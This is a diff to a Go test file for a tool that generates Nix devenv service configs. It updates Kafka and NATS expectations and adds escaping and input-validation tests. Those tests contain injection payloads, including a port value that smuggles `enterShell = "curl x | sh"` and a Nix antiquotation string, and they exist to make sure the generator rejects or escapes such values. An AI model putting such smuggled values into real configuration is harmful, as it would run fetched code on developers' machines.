@@ -1,6 +1,7 @@
 package devenv_test
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/Quantum-Serendipity/qsdev/addons/devenv"
@@ -220,8 +221,13 @@ func TestServiceToTemplateData_KafkaDefaults(t *testing.T) {
 		t.Errorf("NixName = %q, want %q", got.NixName, "kafka")
 	}
 
-	assertContains(t, got.ConfigLines, `settings.listeners = "PLAINTEXT://127.0.0.1:9092";`)
-	assertContains(t, got.ConfigLines, `settings.defaultMode = "kraft";`)
+	// listeners is a list option; kraft needs the CONTROLLER listener kept.
+	assertContains(t, got.ConfigLines, `settings.listeners = [ "PLAINTEXT://127.0.0.1:9092" "CONTROLLER://127.0.0.1:9093" ];`)
+	assertContains(t, got.ConfigLines, `settings."advertised.listeners" = [ "PLAINTEXT://127.0.0.1:9092" ];`)
+	assertContains(t, got.ConfigLines, `settings."controller.quorum.voters" = "1@127.0.0.1:9093";`)
+	// defaultMode is a top-level option, not a server.properties setting.
+	assertContains(t, got.ConfigLines, `defaultMode = "kraft";`)
+	assertNotContainsSubstring(t, got.ConfigLines, "settings.defaultMode")
 	assertContains(t, got.ConfigLines, `settings."auto.create.topics.enable" = true;`)
 	assertContains(t, got.ConfigLines, `settings."num.partitions" = 1;`)
 }
@@ -237,7 +243,7 @@ func TestServiceToTemplateData_KafkaKRaftMode(t *testing.T) {
 		t.Fatalf("unexpected error: %v", err)
 	}
 
-	assertContains(t, got.ConfigLines, `settings.defaultMode = "kraft";`)
+	assertContains(t, got.ConfigLines, `defaultMode = "kraft";`)
 }
 
 func TestServiceToTemplateData_KafkaZooKeeperMode(t *testing.T) {
@@ -251,7 +257,9 @@ func TestServiceToTemplateData_KafkaZooKeeperMode(t *testing.T) {
 		t.Fatalf("unexpected error: %v", err)
 	}
 
-	assertContains(t, got.ConfigLines, `settings.defaultMode = "zookeeper";`)
+	assertContains(t, got.ConfigLines, `defaultMode = "zookeeper";`)
+	// No KRaft controller listener outside kraft mode.
+	assertContains(t, got.ConfigLines, `settings.listeners = [ "PLAINTEXT://127.0.0.1:9092" ];`)
 }
 
 func TestServiceToTemplateData_KafkaCustomPort(t *testing.T) {
@@ -265,7 +273,10 @@ func TestServiceToTemplateData_KafkaCustomPort(t *testing.T) {
 		t.Fatalf("unexpected error: %v", err)
 	}
 
-	assertContains(t, got.ConfigLines, `settings.listeners = "PLAINTEXT://127.0.0.1:9093";`)
+	// The controller moves up with the broker so the two never collide.
+	assertContains(t, got.ConfigLines, `settings.listeners = [ "PLAINTEXT://127.0.0.1:9093" "CONTROLLER://127.0.0.1:9094" ];`)
+	assertContains(t, got.ConfigLines, `settings."advertised.listeners" = [ "PLAINTEXT://127.0.0.1:9093" ];`)
+	assertContains(t, got.ConfigLines, `settings."controller.quorum.voters" = "1@127.0.0.1:9094";`)
 }
 
 // --- MinIO ---
@@ -528,7 +539,9 @@ func TestServiceToTemplateData_NATSDefaults(t *testing.T) {
 	assertContains(t, got.ConfigLines, `monitoring.enable = true;`)
 	assertContains(t, got.ConfigLines, `monitoring.port = 8222;`)
 	assertContains(t, got.ConfigLines, `jetstream.enable = true;`)
-	assertContains(t, got.ConfigLines, `jetstream.storeDir = "$DEVENV_STATE/nats";`)
+	// devenv's nats module has no jetstream.storeDir option (it derives
+	// store_dir from DEVENV_STATE), so emitting one breaks evaluation.
+	assertNotContainsSubstring(t, got.ConfigLines, "storeDir")
 }
 
 func TestServiceToTemplateData_NATSJetStreamDisabled(t *testing.T) {
@@ -614,7 +627,89 @@ func TestServiceToTemplateData_NATSScript(t *testing.T) {
 	}
 }
 
+// --- Escaping and validation ---
+
+func TestServiceToTemplateData_NixStringEscaping(t *testing.T) {
+	t.Parallel()
+	// Payloads that Go's %q leaves live in Nix: "${" antiquotation, plus
+	// quote and backslash, which must be escaped exactly once.
+	const payload = `p${builtins.currentSystem}"q\r`
+	const escaped = `"p\${builtins.currentSystem}\"q\\r"`
+
+	tests := []struct {
+		name string
+		svc  types.ServiceChoice
+		want string
+	}{
+		{"keycloak admin password", types.ServiceChoice{Name: "keycloak", Settings: map[string]string{"admin_password": payload}},
+			`initialAdminPassword = ` + escaped + `;`},
+		{"minio root user", types.ServiceChoice{Name: "minio", Settings: map[string]string{"root_user": payload}},
+			`accessKey = ` + escaped + `;`},
+		{"minio root password", types.ServiceChoice{Name: "minio", Settings: map[string]string{"root_password": payload}},
+			`secretKey = ` + escaped + `;`},
+		{"postgres initial db", types.ServiceChoice{Name: "postgres", Settings: map[string]string{"initial_db": payload}},
+			`initialDatabases = [{ name = ` + escaped + `; }];`},
+		{"mysql initial db", types.ServiceChoice{Name: "mysql", Settings: map[string]string{"initial_db": payload}},
+			`initialDatabases = [{ name = ` + escaped + `; }];`},
+		{"elasticsearch cluster name", types.ServiceChoice{Name: "elasticsearch", Settings: map[string]string{"cluster_name": payload}},
+			`cluster_name = ` + escaped + `;`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			got, err := devenv.ExportServiceToTemplateData(tt.svc)
+			if err != nil {
+				t.Fatalf("unexpected error: %v", err)
+			}
+			assertContains(t, got.ConfigLines, tt.want)
+		})
+	}
+}
+
+func TestServiceToTemplateData_RejectsInvalidSettings(t *testing.T) {
+	t.Parallel()
+	injection := `6379; enterShell = "curl x | sh"`
+	tests := []struct {
+		name string
+		svc  types.ServiceChoice
+	}{
+		{"redis port injection", types.ServiceChoice{Name: "redis", Settings: map[string]string{"port": injection}}},
+		{"redis port out of range", types.ServiceChoice{Name: "redis", Settings: map[string]string{"port": "70000"}}},
+		{"nats port", types.ServiceChoice{Name: "nats", Settings: map[string]string{"port": injection}}},
+		{"nats http port", types.ServiceChoice{Name: "nats", Settings: map[string]string{"http_port": "0"}}},
+		{"nats max payload", types.ServiceChoice{Name: "nats", Settings: map[string]string{"max_payload": "1; x = 1"}}},
+		{"nats jetstream", types.ServiceChoice{Name: "nats", Settings: map[string]string{"jetstream": "yes"}}},
+		{"kafka port", types.ServiceChoice{Name: "kafka", Settings: map[string]string{"port": "abc"}}},
+		{"kafka mode", types.ServiceChoice{Name: "kafka", Settings: map[string]string{"mode": "standalone"}}},
+		{"kafka auto create", types.ServiceChoice{Name: "kafka", Settings: map[string]string{"auto_create_topics": "true; x = 1"}}},
+		{"kafka partitions", types.ServiceChoice{Name: "kafka", Settings: map[string]string{"num_partitions": "-1"}}},
+		{"keycloak http port", types.ServiceChoice{Name: "keycloak", Settings: map[string]string{"http_port": injection}}},
+		{"minio api port", types.ServiceChoice{Name: "minio", Settings: map[string]string{"api_port": "9000/evil"}}},
+		{"mailpit max messages", types.ServiceChoice{Name: "mailpit", Settings: map[string]string{"max_messages": "many"}}},
+		{"postgres version", types.ServiceChoice{Name: "postgres", Version: "16; enterShell = \"x\""}},
+		{"postgres version escape", types.ServiceChoice{Name: "postgres", Version: "16\\"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			if got, err := devenv.ExportServiceToTemplateData(tt.svc); err == nil {
+				t.Errorf("expected an error, got ConfigLines %v", got.ConfigLines)
+			}
+		})
+	}
+}
+
 // --- Test helpers ---
+
+// assertNotContainsSubstring checks that no item in haystack contains sub.
+func assertNotContainsSubstring(t *testing.T, haystack []string, sub string) {
+	t.Helper()
+	for _, item := range haystack {
+		if strings.Contains(item, sub) {
+			t.Errorf("expected no line containing %q, found %q", sub, item)
+		}
+	}
+}
 
 // assertContains checks that needle appears in the haystack slice.
 func assertContains(t *testing.T, haystack []string, needle string) {
